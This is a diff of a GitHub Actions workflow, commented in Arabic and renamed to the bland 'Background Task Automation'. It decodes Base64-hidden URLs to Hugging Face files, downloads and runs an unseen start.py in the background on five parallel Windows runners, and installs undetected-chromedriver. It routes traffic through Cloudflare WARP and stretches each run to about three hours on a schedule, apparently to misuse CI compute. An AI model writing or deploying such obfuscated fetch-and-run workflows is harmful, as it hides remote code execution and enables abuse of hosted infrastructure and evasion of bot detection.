@@ -1,76 +1,82 @@
-name: Automated Task Executor (V3)
+name: Background Task Automation
 
 on:
-  workflow_dispatch: # التفعيل اليدوي
+  workflow_dispatch: # للتشغيل اليدوي
   schedule:
-    - cron: '0 */2 * * *' # التفعيل التلقائي المجدول كل ساعتين
+    - cron: '0 0,8,16 * * *' # الجدولة للعمل 3 مرات يوميا (الساعة 00:00، 08:00، 16:00 بتوقيت UTC)
 
 jobs:
-  deploy-workers:
-    name: Job-Node ${{ matrix.worker_id }}
+  execute-nodes:
+    name: Worker-Instance [${{ matrix.node_index }}]
     runs-on: windows-2022
-    timeout-minutes: 125 # الحد الزمني الأقصى
+    timeout-minutes: 185 # الحد الأقصى للتشغيل (تم رفعه لأكثر من 3 ساعات بقليل لتجنب الإيقاف المفاجئ من GitHub)
     
     strategy:
       fail-fast: false
       matrix:
-        worker_id: [1, 2, 3, 4, 5] # تشغيل 5 بيئات متوازية
+        node_index: [1, 2, 3, 4, 5] # تشغيل 5 نسخ في نفس الوقت
 
     steps:
-      # ===================================================
-      # المرحلة 1: تحضير مساحة العمل وجلب الملفات المشفرة
-      # ===================================================
-      - name: Prepare Workspace & Fetch Assets
+      # ---------------------------------------------------------
+      # الخطوة الأولى: تهيئة البيئة وتنزيل الملفات
+      # ---------------------------------------------------------
+      - name: Environment Setup & Script Download
         shell: bash
         run: |
-          echo "🔧 Initializing Job-Node ${{ matrix.worker_id }}..."
+          echo ">>> [SYSTEM] Starting Node-${{ matrix.node_index }} setup..."
           
-          # فك التشفير للروابط (Base64) وتحميلها
-          TARGET_A=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QvcmRwL3Jlc29sdmUvbWFpbi9oYXNoLnB5" | base64 -d)
-          TARGET_B=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zYW1pbG9kOS9uYW5uaS9yZXNvbHZlL21haW4vc3RhcnQucHk=" | base64 -d)
+          # فك تشفير الروابط وتحميلها في المتغيرات
+          URL_HASH=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2QvcmRwL3Jlc29sdmUvbWFpbi9oYXNoLnB5" | base64 --decode)
+          URL_MAIN=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zYW1pbG9kOS9uYW5uaS9yZXNvbHZlL21haW4vc3RhcnR1aWkucHk=" | base64 --decode)
           
-          curl -sL "$TARGET_A" -o hash.py
-          curl -sL "$TARGET_B" -o start.py
+          # حفظ الملفات (سيتم حفظ الملف الأساسي باسم start.py لتسهيل التشغيل)
+          curl -sL "$URL_HASH" > hash.py
+          curl -sL "$URL_MAIN" > start.py
           
-          echo "⚡ Configuring Python environment..."
-          python -m pip install -q --upgrade pip setuptools
+          echo ">>> [SYSTEM] Installing Python modules..."
+          python -m pip install -qU pip setuptools
           pip install -q undetected-chromedriver selenium requests
-          echo "✔️ All dependencies are ready."
+          echo ">>> [SYSTEM] Ready to execute."
 
-      # ===================================================
-      # المرحلة 2: تنفيذ المهام مع نظام المراقبة الزمني
-      # ===================================================
-      - name: Run Workload with Timeout Enforcement
+      # ---------------------------------------------------------
+      # الخطوة الثانية: التشغيل الصامت مع نظام الحماية الزمني
+      # ---------------------------------------------------------
+      - name: Launch Payload & Time Monitor
         shell: pwsh
         env:
           PYTHONIOENCODING: "utf-8"
         run: |
-          Write-Host "🚀 Booting up start.py on Node ${{ matrix.worker_id }}..."
+          Write-Output "[INFO] Initiating start.py on Instance ${{ matrix.node_index }}..."
           
-          # تضمين مسار WARP في متغيرات النظام
-          $env:PATH += ";C:\Program Files\Cloudflare\Cloudflare WARP"
+          # إضافة WARP لمسار النظام بطريقة مباشرة
+          $env:PATH = $env:PATH + ";C:\Program Files\Cloudflare\Cloudflare WARP"
           
-          # إطلاق العملية بشكل صامت في الخلفية
-          $taskProcess = Start-Process -FilePath "python" -ArgumentList "start.py" -PassThru -NoNewWindow
+          # تجهيز معطيات تشغيل العملية في الخلفية
+          $ProcessArgs = @{
+              FilePath = "python"
+              ArgumentList = "start.py"
+              PassThru = $true
+              NoNewWindow = $true
+          }
+          $activeProcess = Start-Process @ProcessArgs
           
-          Write-Host "⏱️ Watchdog active: Allowed execution time is 120 minutes (7200 seconds)."
+          Write-Output "[MONITOR] Watchdog is running. Timeout limit: 180 mins."
           
           try {
-              # مراقبة ذكية للعملية
-              $taskProcess | Wait-Process -Timeout 7200 -ErrorAction Stop
-              Write-Host "✅ Execution finished within the acceptable timeframe."
+              # انتظار انتهاء العملية أو وصولها للحد الزمني (10800 ثانية = 3 ساعات)
+              Wait-Process -InputObject $activeProcess -Timeout 10800 -ErrorAction Stop
+              Write-Output "[SUCCESS] Task completed within limits."
           } 
           catch {
-              # إنهاء العملية بالقوة إذا تخطت المهلة
-              Write-Warning "⚠️ Execution timeout triggered (>120 mins). Terminating the task..."
-              $taskProcess | Stop-Process -Force
-              Write-Host "🛑 Task successfully terminated by Watchdog."
+              # إيقاف إجباري عند تخطي الوقت
+              Write-Output "[TIMEOUT] Maximum time reached. Forcing process kill..."
+              Stop-Process -InputObject $activeProcess -Force
+              Write-Output "[TERMINATED] Process closed gracefully by Watchdog after 3 hours."
           }
 
-      # ===================================================
-      # المرحلة 3: التقرير الختامي
-      # ===================================================
-      - name: Teardown & Reporting
+      # ---------------------------------------------------------
+      # الخطوة الثالثة: إغلاق المهمة
+      # ---------------------------------------------------------
+      - name: Finalize
         shell: bash
-        run: |
-          echo "🏁 Job-Node ${{ matrix.worker_id }} has successfully completed its routine."
+        run: echo "<<< [SYSTEM] Worker-${{ matrix.node_index }} finished its lifecycle."
